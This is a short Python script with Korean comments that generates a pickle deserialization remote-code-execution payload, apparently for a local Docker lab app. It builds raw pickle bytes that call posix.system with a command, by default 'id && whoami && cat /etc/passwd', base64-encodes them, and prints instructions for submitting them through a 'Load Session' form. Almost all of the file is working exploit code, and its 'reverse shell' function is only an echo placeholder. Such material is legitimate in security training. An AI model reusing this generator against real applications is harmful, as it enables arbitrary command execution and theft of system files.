"""
Pickle RCE Exploit 생성기

주의: pickle.dumps()는 호스트 OS의 모듈명을 사용합니다.
  - Windows: nt.system
  - Linux:   posix.system

Docker 컨테이너(Linux)에서 실행되므로, 직접 pickle 바이트를 구성하여
항상 posix.system을 호출하도록 합니다.
"""
import base64


def generate_linux_payload(command="id && whoami && cat /etc/passwd"):
    """Docker(Linux) 컨테이너용 pickle RCE 페이로드 생성

    Windows에서 실행해도 Linux 컨테이너에서 동작하는 페이로드를 생성합니다.
    pickle protocol 0 형식으로 직접 바이트를 구성하여 posix.system을 호출합니다.
    """
    pickle_data = (
        b"cposix\nsystem\n"                   # GLOBAL: posix.system 임포트
        b"(" + b"S'" + command.encode() + b"'" # MARK + STRING: 명령어 문자열
        b"\ntR."                               # TUPLE, REDUCE, STOP
    )
    return base64.b64encode(pickle_data).decode()


def generate_file_read_payload():
    """파일 읽기 페이로드"""
    return generate_linux_payload("cat /etc/passwd")


def generate_reverse_shell_payload():
    """리버스 쉘 페이로드 (데모용)"""
    return generate_linux_payload("echo 'Reverse shell would execute here'")


if __name__ == "__main__":
    print("=" * 60)
    print("Pickle RCE Exploit Generator")
    print("=" * 60)
    print()

    payload = generate_linux_payload()

    print("생성된 페이로드 (Base64):")
    print("-" * 60)
    print(payload)
    print("-" * 60)
    print()
    print("사용 방법:")
    print("1. http://localhost:5001 접속")
    print("2. 'Load Session' 폼에 위 페이로드 붙여넣기")
    print("3. Submit 후 서버 로그 확인")
    print()
    print("페이로드가 실행되면 서버에서 'id', 'whoami' 명령이 실행됩니다.")
    print()
    print("참고: 이 페이로드는 Windows에서 생성해도")
    print("Linux Docker 컨테이너에서 정상 동작합니다.")
